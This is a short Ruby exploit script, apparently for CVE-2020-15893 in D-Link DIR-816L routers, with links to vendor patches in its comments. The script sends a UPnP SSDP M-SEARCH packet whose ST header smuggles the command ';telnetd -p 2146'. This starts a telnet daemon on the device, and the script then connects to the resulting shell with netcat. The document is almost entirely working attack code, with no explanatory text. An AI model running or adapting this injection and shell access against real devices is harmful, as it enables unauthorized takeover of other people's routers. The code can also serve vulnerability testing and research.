#!/usr/bin/env ruby
# ftp://FTP2.DLINK.COM/SECURITY_ADVISEMENTS/DIR-816L/DIR-816L_REVB_FIRMWARE_PATCH_2.06.B09_BETA.ZIP
# http://legacyfiles.us.dlink.com/DIR-816L/REVB/SECURITY_PATCHES/DIR-816L_REVB_FIRMWARE_PATCH_2.06.B01.ZIP

require 'rex'

host = ARGV[0]

def usage
 puts "[*] CVE-2020-15893 DLINK DIR-816L"
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin
sock = Rex::Socket::Udp.create('PeerHost'  => host,
                               'PeerPort'  => 1900,
                               'LocalPort' => 1901,
)

data =  "M-SEARCH * HTTP/1.1\r\n"
data << "HOST:#{host}:1900\r\n"
data << "ST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 2146\r\n"
data << "MX:2\r\n"
data << "MAN:”ssdp:discover”\r\n\r\n"

sock.write(data)
select(nil,nil,nil,1)
system("nc #{host} 2146")
rescue => e
puts "[!] #{e.to_s}"
end
